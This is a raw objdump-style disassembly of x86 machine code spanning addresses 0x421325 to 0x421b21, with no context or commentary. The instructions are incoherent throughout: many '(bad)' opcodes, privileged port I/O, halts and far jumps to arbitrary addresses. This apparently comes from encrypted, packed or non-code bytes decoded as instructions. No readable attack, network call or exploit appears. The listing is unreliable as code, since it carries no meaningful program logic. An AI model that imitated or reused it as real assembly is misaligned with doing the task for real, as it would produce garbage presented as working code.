  421325:	add    eax,0x6ca240ce
  42132a:	push   0xffffffab
  42132c:	or     al,0x60
  42132e:	hlt    
  42132f:	aaa    
  421330:	sub    DWORD PTR cs:[esi+0x61c3bbe6],eax
  421337:	fiadd  WORD PTR [eax-0x13bfe99e]
  42133d:	jecxz  0x42139f
  42133f:	fld    DWORD PTR [edi-0x6a29ffd2]
  421345:	pop    ebx
  421346:	mov    esp,0x2b0c1be6
  42134b:	pop    ecx
  42134c:	fld    DWORD PTR [edi-0x7820624b]
  421352:	mov    ch,0x95
  421354:	fisttp DWORD PTR [ebp+0x50e78da5]
  42135a:	not    ah
  42135c:	sti    
  42135d:	adc    BYTE PTR [ecx],al
  42135f:	clc    
  421360:	xor    al,0xfb
  421362:	out    0xa1,al
  421364:	popa   
  421365:	push   esp
  421366:	add    eax,0xd4c605e
  42136b:	bound  esp,QWORD PTR [edx+0x44]
  42136e:	add    eax,0x3dfba736
  421373:	inc    edx
  421374:	out    0xe8,eax
  421376:	loopne 0x4213cc
  421378:	xor    eax,0x8df4aafb
  42137d:	call   0xfb76c99d
  421382:	jb     0x42137e
  421384:	cli    
  421385:	or     al,0x72
  421387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421388:	popa   
  421389:	add    edx,DWORD PTR [esi-0x567a2532]
  42138f:	rcr    ebx,cl
  421391:	jg     0x421393
  421393:	lods   eax,DWORD PTR ds:[esi]
  421394:	into   
  421395:	call   0x8a1d3ca9
  42139a:	enter  0x91e3,0x6f
  42139e:	add    bl,cl
  4213a0:	arpl   bx,bp
  4213a2:	test   DWORD PTR ds:0xe80b49,esi
  4213a8:	lea    ecx,[eax-0x5]
  4213ab:	push   DWORD PTR [edi]
  4213ad:	popf   
  4213ae:	outs   dx,DWORD PTR ds:[esi]
  4213af:	pop    es
  4213b0:	inc    eax
  4213b1:	inc    esi
  4213b2:	mov    bh,cl
  4213b4:	sbb    al,0x6b
  4213b6:	add    eax,DWORD PTR [ebx+0xb6fce6d]
  4213bc:	ss out 0x6f,eax
  4213bf:	pop    es
  4213c0:	add    BYTE PTR [edi-0x3018d91d],bl
  4213c6:	cld    
  4213c7:	mov    eax,DWORD PTR [eax+eax*4-0x31c37506]
  4213ce:	or     ebx,DWORD PTR [edi-0x68]
  4213d1:	call   0x8b52:0xda87c25d
  4213d8:	push   0x59
  4213da:	cmc    
  4213db:	jne    0x421454
  4213dd:	or     BYTE PTR [ebx+0x7e6a885e],bh
  4213e3:	shl    BYTE PTR [edi-0x75ff96b9],cl
  4213e9:	xchg   DWORD PTR [ebx+0x31],esp
  4213ec:	sub    eax,0x4b69fb1d
  4213f1:	arpl   cx,cx
  4213f3:	call   0x3e572b
  4213f8:	mov    cl,0xf2
  4213fa:	call   0x2ad55911
  4213ff:	dec    BYTE PTR [edx-0x23]
  421402:	xor    ecx,ecx
  421404:	repz sub ebp,esi
  421407:	(bad)  
  421408:	in     al,dx
  421409:	pop    eax
  42140a:	mov    ebx,0xb562000f
  42140f:	sbb    DWORD PTR ds:[ecx],0xffffffcd
  421413:	or     al,0x89
  421415:	pop    esp
  421416:	retf   0x8905
  421419:	sbb    al,0xb7
  42141b:	out    dx,eax
  42141c:	mov    DWORD PTR [ecx],esp
  42141e:	retf   
  42141f:	mov    dl,0xc0
  421421:	xor    al,0xbb
  421423:	adc    al,0x30
  421425:	mov    ds:0x80730dc4,al
  42142a:	outs   dx,DWORD PTR ds:[esi]
  42142b:	scas   eax,DWORD PTR es:[edi]
  42142c:	dec    edi
  42142d:	sub    al,0x18
  42142f:	aam    0xfd
  421431:	and    eax,DWORD PTR [eax-0x51]
  421434:	dec    edi
  421435:	mov    ch,0x14
  421437:	add    edx,DWORD PTR [ecx]
  421439:	and    al,BYTE PTR [eax-0x7a]
  42143c:	neg    edi
  42143e:	out    dx,al
  42143f:	nop
  421440:	pop    es
  421441:	jmp    0xe940bd53
  421446:	in     eax,dx
  421447:	adc    dl,BYTE PTR [ecx]
  421449:	fsin   
  42144b:	mov    dl,0x5d
  42144d:	mov    eax,ds:0xe1eb8674
  421452:	xor    esi,edx
  421454:	mov    bl,BYTE PTR [edi]
  421456:	in     al,0xad
  421458:	push   esp
  421459:	clc    
  42145a:	adc    ebp,DWORD PTR [edi-0x56a99778]
  421460:	cld    
  421461:	xchg   ecx,eax
  421462:	sub    al,0x15
  421464:	adc    cl,dl
  421466:	xor    DWORD PTR [edi-0x6f7d1901],edi
  42146c:	sbb    al,0xe3
  42146e:	lea    edx,[eax]
  421470:	inc    DWORD PTR [eax]
  421472:	ins    DWORD PTR es:[edi],dx
  421473:	inc    edx
  421474:	push   DWORD PTR [edx+0x4c]
  421477:	jae    0x421434
  421479:	mul    DWORD PTR [ebx+0x41]
  42147c:	(bad)  
  42147d:	jmp    FWORD PTR [edi+0x67ae83d]
  421483:	sub    dl,BYTE PTR [edx-0x13267311]
  421489:	mov    BYTE PTR [eax-0x59f331d7],dl
  42148f:	pusha  
  421490:	stos   DWORD PTR es:[edi],eax
  421491:	mov    dh,0x24
  421493:	sbb    DWORD PTR [esi+0x28],esp
  421496:	cmp    eax,0xeb891a8b
  42149b:	call   0x34f94113
  4214a0:	jb     0x4214b7
  4214a2:	loop   0x4214d5
  4214a4:	retf   
  4214a5:	add    al,0xe0
  4214a7:	enter  0x3e8,0x62
  4214ab:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4214ad:	fistp  WORD PTR [ebp-0x77]
  4214b0:	mov    edi,0xb2d34bc3
  4214b5:	test   eax,0x93dc34b6
  4214ba:	pop    esp
  4214bb:	cdq    
  4214bc:	jmp    0x6e26fa3f
  4214c1:	sbb    ebx,DWORD PTR [ebp+0x42a9e934]
  4214c7:	lods   ax,WORD PTR ds:[esi]
  4214c9:	fistp  WORD PTR [ebp-0x41]
  4214cc:	jns    0x421482
  4214ce:	xchg   dh,cl
  4214d0:	(bad)  
  4214d1:	in     eax,dx
  4214d2:	cmp    eax,0x4066d9
  4214d7:	imul   esp,DWORD PTR [esi-0x53],0x8f8b59df
  4214de:	cmc    
  4214df:	adc    eax,0x5e147f8c
  4214e4:	into   
  4214e5:	jge    0x4214d9
  4214e7:	xchg   ebp,eax
  4214e8:	fldcw  WORD PTR [ebx+eax*2+0x5e]
  4214ec:	pop    ebp
  4214ed:	lahf   
  4214ee:	add    esp,DWORD PTR [edx-0x27]
  4214f1:	ss scas eax,DWORD PTR es:[edi]
  4214f3:	call   0x90321abc
  4214f8:	pusha  
  4214f9:	lods   al,BYTE PTR ds:[esi]
  4214fa:	mov    BYTE PTR [edi],cl
  4214fc:	mov    esi,ecx
  4214fe:	shl    BYTE PTR [edx+0x11],1
  421501:	add    BYTE PTR [edx+0x7a],ch
  421504:	(bad)  
  421505:	or     esp,DWORD PTR [esi-0x72]
  421508:	xor    al,0xfb
  42150a:	jmp    0x6942b3ea
  42150f:	push   0xe1ec743b
  421514:	sub    ch,al
  421516:	adc    al,0x5c
  421518:	pop    edx
  421519:	clc    
  42151a:	in     al,dx
  42151b:	(bad)  
  42151d:	xchg   DWORD PTR [esi+0x292497fa],esp
  421523:	popa   
  421524:	cwde   
  421525:	add    DWORD PTR [edi],edx
  421527:	jecxz  0x421559
  421529:	add    eax,0x6c5ed2da
  42152e:	add    eax,0xbce7d8c6
  421533:	mov    DWORD PTR [edx],eax
  421535:	pop    ss
  421536:	jmp    0x421599
  421538:	pop    edx
  421539:	clc    
  42153a:	inc    esi
  42153b:	add    ah,bl
  42153d:	sbb    bh,ah
  42153f:	rcr    dl,cl
  421541:	(bad)  
  421542:	js     0x42151c
  421544:	mov    eax,ds:0x8a268633
  421549:	xchg   edi,eax
  42154a:	and    al,0xad
  42154c:	dec    edi
  42154d:	cwde   
  42154e:	sbb    al,0x1
  421550:	cmp    DWORD PTR [ecx-0x18],ebx
  421553:	in     al,dx
  421554:	call   0xe33231f0
  421559:	sbb    BYTE PTR ds:0x2497e49a,al
  42155f:	fnsave [ecx+0x25cd7434]
  421565:	sar    ebx,0xee
  421568:	xchg   DWORD PTR [edi-0x40],edx
  42156b:	pop    ebp
  42156c:	xor    BYTE PTR [edx+0x44],ah
  42156f:	add    eax,0x6ac40232
  421574:	pop    esi
  421575:	xlat   BYTE PTR ds:[ebx]
  421576:	mov    DWORD PTR ds:0xb8c84a,esp
  42157c:	imul   edx,DWORD PTR [edx],0x21fd003a
  421582:	pop    ds
  421583:	adc    al,0x22
  421585:	popa   
  421586:	mov    ebx,0x6fc83a74
  42158b:	and    al,0x3b
  42158d:	mov    dl,0x6
  42158f:	inc    esp
  421590:	push   edi
  421591:	and    ebx,edi
  421593:	mov    bh,BYTE PTR [ebp+edx*8-0x28f59542]
  42159a:	push   edx
  42159b:	push   0xfffffffe
  42159d:	pop    ecx
  42159e:	aas    
  42159f:	and    al,0x0
  4215a1:	pop    es
  4215a2:	addr16 push esp
  4215a4:	push   0x54
  4215a6:	(bad)  
  4215a7:	into   
  4215a8:	test   DWORD PTR [ebx],ecx
  4215aa:	xlat   BYTE PTR ds:[ebx]
  4215ab:	aas    
  4215ac:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215ae:	add    DWORD PTR [esi+0x4b355f44],0xffffffff
  4215b5:	lahf   
  4215b6:	cmp    al,BYTE PTR [edi]
  4215b8:	push   0xffffffc5
  4215ba:	outs   dx,DWORD PTR ds:[esi]
  4215bb:	imul   edi,edi,0x116b3024
  4215c1:	sti    
  4215c2:	(bad)  
  4215c3:	pop    ebp
  4215c4:	mov    ecx,DWORD PTR [ebp+0x67]
  4215c7:	add    ah,0x63
  4215ca:	fwait
  4215cb:	pop    es
  4215cc:	add    ch,cl
  4215ce:	mov    bl,0xea
  4215d0:	push   0x7b
  4215d2:	push   esp
  4215d3:	sti    
  4215d4:	(bad)  
  4215d5:	lea    edi,[esi]
  4215d7:	mov    eax,ds:0xec78b40
  4215dc:	mov    esp,0x88fb168d
  4215e1:	mov    ebp,0xf5c689da
  4215e6:	call   0xf:0xce5a8b55
  4215ed:	cmp    edx,esi
  4215ef:	repnz inc esp
  4215f1:	pop    edi
  4215f2:	xor    eax,0x436273fa
  4215f7:	jp     0x4215c6
  4215f9:	dec    edx
  4215fa:	(bad)  
  4215fb:	cld    
  4215fc:	(bad)  
  4215fd:	sub    eax,0x205d49a7
  421602:	cmp    al,0xff
  421604:	push   ebp
  421605:	add    cl,ch
  421607:	jo     0x42158b
  421609:	jge    0x421669
  42160b:	inc    eax
  42160c:	inc    esi
  42160d:	add    eax,0xffbf9e6a
  421612:	xchg   ecx,eax
  421613:	cmp    al,BYTE PTR [edx-0x67be9983]
  421619:	or     ebp,esi
  42161b:	sub    al,0x63
  42161d:	adc    eax,0x4d8240a2
  421622:	pop    esi
  421623:	mov    bl,0xb1
  421625:	shr    cl,0xf8
  421628:	or     BYTE PTR [ecx],dh
  42162a:	mov    ds:0x56c689ff,al
  42162f:	sub    cl,dl
  421631:	(bad)  
  421632:	dec    esi
  421633:	es test dh,dh
  421636:	fs inc ecx
  421638:	add    al,0x80
  42163a:	cs sar BYTE PTR ds:[edi-0x1485ab5f],cl
  421642:	adc    edi,DWORD PTR [edi-0x429d0458]
  421648:	enter  0x32fb,0x4e
  42164c:	xchg   edi,eax
  42164d:	(bad)  
  42164e:	and    DWORD PTR [eax-0x1],eax
  421651:	imul   esp,DWORD PTR [edx+0x71],0x31ca120e
  421658:	mov    edi,0x87ffdeff
  42165d:	add    al,0xd9
  42165f:	test   BYTE PTR [ebx],cl
  421661:	and    BYTE PTR [edx+0x223105ac],0xfa
  421668:	inc    edx
  421669:	mov    BYTE PTR [eax],al
  42166b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42166c:	push   ss
  42166d:	test   DWORD PTR [edi*8+0x59e835d9],0x3d098d42
  421678:	xor    DWORD PTR [esi-0x40],ebx
  42167b:	and    ecx,0xda664ec0
  421681:	jmp    0x4e3b76ce
  421686:	enter  0xcb1d,0xe8
  42168a:	lds    edx,FWORD PTR ds:0x79e7e418
  421690:	xchg   ebp,eax
  421691:	jmp    0xe9dd1b79
  421696:	push   ebx
  421697:	cld    
  421698:	sbb    edi,edi
  42169a:	iret   
  42169b:	mov    esp,ecx
  42169d:	mov    dl,bh
  42169f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216a0:	mov    al,0x2d
  4216a2:	add    al,0xe7
  4216a4:	(bad)  
  4216a5:	jge    0x42169b
  4216a7:	popf   
  4216a8:	fldcw  WORD PTR [esp+eax*2+0x51]
  4216ac:	retf   
  4216ad:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216af:	test   ecx,ebx
  4216b1:	sub    al,ah
  4216b3:	gs retf 
  4216b5:	call   0xa959d47f
  4216ba:	out    0x55,eax
  4216bc:	fisub  DWORD PTR [edi+0x6e87a303]
  4216c2:	adc    esp,edx
  4216c4:	out    dx,eax
  4216c5:	jmp    0xaba65d61
  4216ca:	pop    es
  4216cb:	sub    ah,BYTE PTR [ebp+0x1000bbdd]
  4216d1:	leave  
  4216d2:	and    bl,dl
  4216d4:	jge    0x421660
  4216d6:	cmp    al,0x3
  4216d8:	bound  eax,QWORD PTR [edx+ebp*8+0x10]
  4216dc:	das    
  4216dd:	inc    ecx
  4216de:	jno    0x42173e
  4216e0:	ins    BYTE PTR es:[edi],dx
  4216e1:	xor    BYTE PTR [esi+0x2],ch
  4216e4:	jp     0x42166b
  4216e6:	loop   0x4216ea
  4216e8:	bound  ebx,QWORD PTR [eax+eax*1-0x31]
  4216ec:	popa   
  4216ed:	pop    edx
  4216ee:	(bad)  
  4216ef:	in     eax,0x61
  4216f1:	(bad)  
  4216f2:	mov    edi,0x7f27c73e
  4216f7:	push   ds
  4216f8:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4216fa:	add    al,0x1b
  4216fc:	sahf   
  4216fd:	inc    ecx
  4216fe:	push   edx
  4216ff:	aaa    
  421700:	dec    esi
  421701:	inc    esi
  421702:	sti    
  421703:	(bad)  
  421704:	push   edx
  421705:	popa   
  421706:	lock fs jnp 0x4216b6
  42170a:	inc    ebx
  42170b:	mov    edi,0xeb10fc1d
  421710:	out    dx,eax
  421711:	fcomp  QWORD PTR [eax+0x13]
  421714:	adc    eax,DWORD PTR [edi+0x26a1240b]
  42171a:	inc    esp
  42171b:	int    0xf1
  42171d:	outs   dx,DWORD PTR cs:[esi]
  42171f:	jmp    0x42176b
  421721:	or     BYTE PTR [esi-0x3f],ah
  421724:	leave  
  421725:	fldenv [eax+0xc36629]
  42172b:	add    ebx,ecx
  42172d:	lahf   
  42172e:	data16 loope 0x4217a3
  421731:	lods   al,BYTE PTR ds:[esi]
  421732:	and    al,0xd
  421734:	add    BYTE PTR [eax],cl
  421736:	cmp    BYTE PTR [ecx+0x2a],dl
  421739:	pusha  
  42173a:	fld    DWORD PTR [ebp-0x761d33d7]
  421740:	push   ss
  421741:	sbb    edx,DWORD PTR [ebp-0x269e17fc]
  421747:	add    BYTE PTR [ecx+0x60],bh
  42174a:	inc    edx
  42174b:	or     DWORD PTR [edx+0x23],esp
  42174e:	cmp    ah,ch
  421750:	out    0x60,eax
  421752:	fldcw  WORD PTR [esi]
  421754:	sub    ebx,edx
  421756:	mov    WORD PTR [esi-0x78799e0f],?
  42175c:	adc    dh,bl
  42175e:	in     al,dx
  42175f:	add    BYTE PTR [ebp+0xc0eb65],dl
  421765:	push   eax
  421766:	jo     0x4217bd
  421768:	call   0x3ee188
  42176d:	ror    dl,0x7e
  421770:	not    bh
  421772:	pop    ds
  421773:	cmc    
  421774:	inc    esp
  421775:	push   edi
  421776:	fsin   
  421778:	imul   ecx,DWORD PTR [ebx+eax*4+0x69],0x3e2e721f
  421780:	rcl    DWORD PTR ds:0x3a0c1f22,0x47
  421787:	add    edi,esi
  421789:	ret    
  42178a:	push   ebx
  42178b:	xor    ebp,DWORD PTR [eax+0x9]
  42178e:	mov    ebx,0x676b003b
  421793:	jecxz  0x4217fa
  421795:	mov    ch,0xd4
  421797:	add    BYTE PTR [ebp+0x650cb00],al
  42179d:	mov    DWORD PTR [eax+ebx*4],edx
  4217a0:	inc    esp
  4217a1:	add    al,0xf9
  4217a3:	fiadd  DWORD PTR [eax]
  4217a5:	add    BYTE PTR [ebx],ch
  4217a7:	aam    0xe9
  4217a9:	or     DWORD PTR [eax-0x11],edx
  4217ac:	jecxz  0x42173e
  4217ae:	(bad)
  4217b1:	xor    bh,bl
  4217b3:	jg     0x421811
  4217b5:	ret    0xdab7
  4217b8:	dec    edi
  4217b9:	mov    ebp,DWORD PTR [edi]
  4217bb:	pop    edx
  4217bc:	out    0x10,eax
  4217be:	dec    eax
  4217bf:	sub    bh,0x0
  4217c2:	cmp    BYTE PTR [eax+0x64c800f3],al
  4217c8:	push   esp
  4217c9:	push   0xffffff8a
  4217cb:	pop    ecx
  4217cc:	inc    esi
  4217cd:	hlt    
  4217ce:	add    bl,cl
  4217d0:	jecxz  0x421759
  4217d2:	cmp    al,0xde
  4217d4:	cld    
  4217d5:	test   BYTE PTR [ebx],bh
  4217d7:	push   eax
  4217d8:	(bad)  
  4217d9:	imul   ebx,DWORD PTR [edi-0x7e],0xbb6228e8
  4217e0:	xchg   ecx,eax
  4217e1:	repz fnstenv [ebp-0x9]
  4217e5:	xchg   BYTE PTR ds:0x6e42763c,bl
  4217eb:	test   eax,0x10cf88d3
  4217f0:	jl     0x421836
  4217f2:	pop    esi
  4217f3:	mov    ebx,0xef5e6a02
  4217f8:	jge    0x42183e
  4217fa:	push   edx
  4217fb:	or     BYTE PTR [edx-0x3c],cl
  4217fe:	add    BYTE PTR [ebx+0x40],ah
  421801:	jbe    0x42184f
  421803:	push   edx
  421804:	fsqrt  
  421806:	mov    BYTE PTR [edx],cl
  421808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421809:	shl    bl,0xa
  42180c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42180d:	or     eax,0x3ebb15fc
  421812:	pop    esp
  421813:	lods   al,BYTE PTR ds:[esi]
  421814:	retf   
  421815:	cmp    eax,0xb54056c1
  42181a:	mov    bl,dh
  42181c:	inc    edi
  42181d:	repz push ebp
  421820:	aas    
  421821:	adc    eax,0x4384643
  421826:	je     0x421885
  421828:	stos   DWORD PTR es:[edi],eax
  421829:	cmp    eax,0x43676e7
  42182e:	add    cl,ch
  421830:	jge    0x4217df
  421832:	shl    DWORD PTR [esi+0x40],0xb5
  421836:	mov    bl,dl
  421838:	stos   BYTE PTR es:[edi],al
  421839:	mov    ebp,0xeb35a507
  42183e:	mov    eax,ds:0xc6884022
  421843:	cmp    dh,BYTE PTR ss:[esi-0x2]
  421847:	adc    dl,BYTE PTR [edi+0x15e107af]
  42184d:	idiv   edi
  42184f:	call   0xd628c649
  421854:	cld    
  421855:	or     bh,ah
  421857:	das    
  421858:	fldcw  WORD PTR [esi+0x1f]
  42185b:	sub    al,0x88
  42185d:	mov    dl,0x7a
  42185f:	ins    BYTE PTR es:[edi],dx
  421860:	pop    ecx
  421861:	xchg   edx,eax
  421862:	sti    
  421863:	add    BYTE PTR [ebp-0x57],ch
  421866:	in     eax,0x53
  421868:	fs inc edx
  42186a:	xchg   ecx,eax
  42186b:	add    al,0x2d
  42186e:	jmp    0xda8c3428
  421873:	ret    
  421874:	dec    ebp
  421875:	jb     0x4218b0
  421877:	test   BYTE PTR [ebp+0x3839d1d9],0x2d
  42187e:	fidivr DWORD PTR [ecx+0x45]
  421881:	push   edi
  421882:	fistp  DWORD PTR [eax-0x7f249f92]
  421888:	shl    BYTE PTR [ecx],0xe9
  42188b:	jle    0x42182d
  42188d:	xor    DWORD PTR [ecx],ebx
  42188f:	mov    dh,0x16
  421891:	mov    edx,ebp
  421893:	xchg   ch,cl
  421895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421896:	add    bh,BYTE PTR [ecx-0x68]
  421899:	xor    DWORD PTR [ebx+edi*1+0x71],ebp
  42189d:	stc    
  42189e:	outs   dx,BYTE PTR ds:[esi]
  42189f:	add    ebp,ecx
  4218a1:	xchg   BYTE PTR [ebp+0x392c9cb2],dl
  4218a7:	lock ficomp DWORD PTR [esi+0x56b3d185]
  4218ae:	test   eax,0xe2312079
  4218b3:	(bad)  
  4218b4:	fwait
  4218b5:	bound  ebx,QWORD PTR [eax+edx*1]
  4218b8:	(bad)  
  4218ba:	mov    ecx,0x6ee12c0c
  4218bf:	push   es
  4218c0:	or     al,0x2c
  4218c2:	mov    ecx,0x4d96dafb
  4218c7:	scas   al,BYTE PTR es:[edi]
  4218c8:	add    al,ah
  4218ca:	sbb    DWORD PTR [ebp-0xe6b1afa],edi
  4218d0:	sbb    bh,ch
  4218d2:	out    0x0,eax
  4218d4:	sub    DWORD PTR [edi+0xa94bf13],edi
  4218da:	inc    eax
  4218db:	push   ecx
  4218dc:	jb     0x42187f
  4218de:	aam    0x7f
  4218e0:	test   BYTE PTR [ebp+0x2c],ah
  4218e3:	xchg   cl,ah
  4218e5:	in     al,dx
  4218e6:	xchg   ah,bh
  4218e8:	mov    ebx,0xb1512db1
  4218ed:	ficomp DWORD PTR [edi+0x5793bafc]
  4218f3:	shl    dh,0x24
  4218f6:	and    al,BYTE PTR [edi+0x52198928]
  4218fc:	mov    ds:0xe940c4e1,eax
  421901:	test   al,0x4c
  421903:	adc    ebp,DWORD PTR [ecx]
  421905:	inc    cx
  421907:	inc    ecx
  421908:	int3   
  421909:	push   esi
  42190a:	sub    eax,0x25e4b987
  42190f:	je     0x421932
  421911:	iret   
  421912:	sub    al,0x74
  421914:	or     eax,0x19152e62
  421919:	adc    ebp,esp
  42191b:	add    BYTE PTR [edx+0x69],dh
  42191e:	push   edi
  42191f:	sti    
  421920:	adc    eax,0x3e0a610d
  421925:	mov    ah,0x2c
  421927:	push   ecx
  421928:	leave  
  421929:	fsubr  QWORD PTR [ebx+0x75]
  42192c:	rol    DWORD PTR [eax],cl
  42192e:	fisub  WORD PTR [esp+eax*2-0x3b]
  421932:	shl    DWORD PTR [eax+0xa],1
  421935:	sbb    DWORD PTR [ebp*1+0x6bdcb151],edx
  42193c:	jne    0x421941
  42193e:	outs   dx,DWORD PTR ds:[esi]
  42193f:	test   al,0x24
  421941:	cmc    
  421942:	cmp    dl,dh
  421944:	push   edx
  421945:	push   esi
  421946:	icebp  
  421947:	sti    
  421948:	test   DWORD PTR [ecx],ebp
  42194a:	int3   
  42194b:	fild   WORD PTR [edi-0x4ae7300]
  421951:	push   ebp
  421952:	push   esp
  421953:	push   0x443b853b
  421958:	add    ecx,DWORD PTR [ebx+0x50fc657d]
  42195e:	jae    0x421968
  421960:	cmc    
  421961:	push   edi
  421962:	push   esp
  421963:	and    eax,DWORD PTR [edi+0x13]
  421966:	mov    ebx,0xb4c689d7
  42196b:	jge    0x42192e
  42196d:	adc    BYTE PTR [ebx+0x68],cl
  421970:	dec    edx
  421971:	push   ebx
  421972:	out    dx,al
  421973:	fs push esp
  421975:	mov    esp,DWORD PTR [edx-0x32]
  421978:	pop    ebp
  421979:	push   DWORD PTR [edi+ebx*8]
  42197c:	mov    BYTE PTR [edi+ebp*2+0x35],bl
  421980:	mov    al,dh
  421982:	pop    eax
  421983:	xchg   ebp,eax
  421984:	add    BYTE PTR [edi+ebx*2+0x29],0x7e
  421989:	test   BYTE PTR [edi+0x6f448270],0x25
  421990:	mov    BYTE PTR [esi],cl
  421992:	add    BYTE PTR [esi+0x6b101f19],al
  421998:	fisubr WORD PTR [edi+0x24]
  42199b:	arpl   WORD PTR [esi],bp
  42199d:	mov    ah,0xc3
  42199f:	cmp    esp,DWORD PTR [edi-0x4]
  4219a2:	push   ecx
  4219a3:	adc    ebp,DWORD PTR [edi+eax*2-0x2efc14dc]
  4219aa:	test   DWORD PTR [ebx+0x52ca3e2e],edi
  4219b0:	jno    0x4219d1
  4219b2:	adc    BYTE PTR [eax-0x29],dl
  4219b5:	push   edx
  4219b6:	jmp    FWORD PTR [ebx+0x2d]
  4219b9:	mov    BYTE PTR [edi+ebx*4+0x26],bh
  4219bd:	jle    0x4219be
  4219bf:	lahf   
  4219c0:	cmp    eax,0xdf910788
  4219c5:	push   esp
  4219c6:	jmp    DWORD PTR [edx+0x70]
  4219c9:	scas   eax,DWORD PTR es:[edi]
  4219ca:	mov    BYTE PTR [ebp+0x63],dl
  4219cd:	jp     0x4219be
  4219cf:	popf   
  4219d0:	push   ecx
  4219d1:	div    DWORD PTR [eax]
  4219d3:	mov    ds:0xf60c0eb5,al
  4219d8:	add    BYTE PTR [edi+eax*2],bl
  4219db:	xor    edi,ebx
  4219dd:	nop
  4219de:	and    ecx,DWORD PTR [edx+0x6f]
  4219e1:	push   es
  4219e2:	jae    0x421a22
  4219e4:	or     BYTE PTR [edi],dl
  4219e6:	adc    ch,BYTE PTR [ebp-0x3d]
  4219e9:	pop    es
  4219ea:	mov    BYTE PTR [edx+0x66722bb5],cl
  4219f0:	outs   dx,BYTE PTR ds:[esi]
  4219f1:	aas    
  4219f2:	call   0xe77bc17c
  4219f7:	add    BYTE PTR [ebx+0x22],al
  4219fa:	push   es
  4219fb:	cld    
  4219fc:	fldenv [edi]
  4219fe:	cmp    ah,0xb6
  421a01:	fdivr  DWORD PTR [ebx+0x4]
  421a04:	xchg   ecx,eax
  421a05:	jecxz  0x421a0e
  421a07:	dec    edi
  421a08:	xor    BYTE PTR [edi+0xfd954f6],0x6
  421a0f:	dec    esi
  421a10:	push   0xffffffbd
  421a12:	adc    DWORD PTR [esi+ebp*8],ecx
  421a15:	jg     0x421a8e
  421a17:	inc    ebx
  421a18:	inc    esi
  421a19:	or     al,0x7a
  421a1b:	or     BYTE PTR [ecx-0x17f84b85],dh
  421a21:	sti    
  421a22:	loopne 0x421a37
  421a24:	xchg   ebp,eax
  421a25:	jmp    0xf42:0xe98b58a9
  421a2c:	bound  eax,QWORD PTR [edx+0x0]
  421a2f:	clc    
  421a30:	push   esi
  421a31:	cld    
  421a32:	add    al,0xff
  421a34:	dec    esi
  421a35:	ins    DWORD PTR es:[edi],dx
  421a36:	mov    cl,0xbd
  421a38:	dec    esi
  421a39:	sub    al,0xbb
  421a3b:	jmp    FWORD PTR [edi]
  421a3d:	mov    ebx,0xd9504bf0
  421a42:	test   eax,0xd5310203
  421a47:	mov    edi,0x90e871ad
  421a4c:	inc    esi
  421a4d:	push   esi
  421a4e:	add    al,0xdc
  421a50:	or     DWORD PTR [ebp-0x2799fc17],edx
  421a56:	and    eax,DWORD PTR [eax]
  421a58:	hlt    
  421a59:	mov    ebp,0x620003ad
  421a5e:	adc    ah,ah
  421a60:	pop    es
  421a61:	icebp  
  421a62:	xchg   esp,eax
  421a63:	jmp    0xe9dae1e4
  421a68:	gs jne 0x421a0f
  421a6b:	lods   eax,DWORD PTR ds:[esi]
  421a6c:	add    ecx,DWORD PTR [edx+ebp*1]
  421a6f:	hlt    
  421a70:	ret    
  421a71:	jae    0x421a0c
  421a73:	jmp    0x6ed13d21
  421a78:	pop    ss
  421a79:	loop   0x421ab0
  421a7b:	sar    DWORD PTR [eax-0x50],1
  421a7e:	xor    eax,0xc5cbb293
  421a83:	outs   dx,BYTE PTR ds:[esi]
  421a84:	adc    ecx,DWORD PTR [ecx+esi*1+0x292f5fc6]
  421a8b:	pop    esi
  421a8c:	(bad)  
  421a8d:	jne    0x421a5a
  421a8f:	sub    DWORD PTR [ecx+ebp*8],eax
  421a92:	sahf   
  421a93:	aad    0xb4
  421a95:	push   ss
  421a96:	mov    al,0xd
  421a98:	or     DWORD PTR [esi],esi
  421a9a:	push   ebx
  421a9b:	sub    edx,esp
  421a9d:	loopne 0x421ab8
  421a9f:	xor    al,0x1
  421aa1:	xor    BYTE PTR [ecx],bl
  421aa3:	nop
  421aa4:	pop    ds
  421aa5:	cmc    
  421aa6:	sub    cl,ch
  421aa8:	popf   
  421aa9:	dec    eax
  421aaa:	push   esi
  421aab:	cmp    al,0x10
  421aad:	mov    WORD PTR [ecx],?
  421aaf:	dec    esi
  421ab0:	pop    edi
  421ab1:	fild   QWORD PTR [eax]
  421ab3:	je     0x421a74
  421ab5:	ror    DWORD PTR [ecx+0x2879927a],1
  421abb:	add    BYTE PTR [esi+0x64349e49],bl
  421ac1:	add    BYTE PTR [esi],ah
  421ac3:	lods   al,BYTE PTR ds:[esi]
  421ac4:	fcmovbe st,st(3)
  421ac6:	retf   
  421ac7:	push   ebx
  421ac8:	push   ebp
  421ac9:	push   ebp
  421aca:	stc    
  421acb:	inc    eax
  421acc:	mov    al,ds:0x8d25588c
  421ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ad2:	ins    DWORD PTR es:[edi],dx
  421ad3:	cwde   
  421ad4:	sti    
  421ad5:	mov    edi,0x70d325ad
  421ada:	mov    al,ds:0xf2298598
  421adf:	sbb    DWORD PTR [esi-0x32],esp
  421ae2:	hlt    
  421ae3:	mov    dh,ah
  421ae5:	rcr    BYTE PTR [ecx+0x5b],0xa5
  421ae9:	pop    ds
  421aea:	pop    ebx
  421aeb:	push   ebx
  421aec:	inc    ebp
  421aed:	sbb    eax,0xbd7225ae
  421af2:	push   0xd
  421af4:	mov    DWORD PTR [edi+0x75c05b29],ebp
  421afa:	test   eax,0xf56420b2
  421aff:	sub    ebx,DWORD PTR [ecx+0x1]
  421b02:	fdivr  QWORD PTR [edx-0x6]
  421b05:	out    0xac,al
  421b07:	fwait
  421b08:	hlt    
  421b09:	cmp    DWORD PTR [ebx-0x52],ebx
  421b0c:	sub    al,0xd6
  421b0e:	jb     0x421b6f
  421b10:	inc    edx
  421b11:	or     eax,0x7474689d
  421b16:	test   esi,0x8f6e148d
  421b1c:	call   0xfb68c047
  421b21:	pop    esp
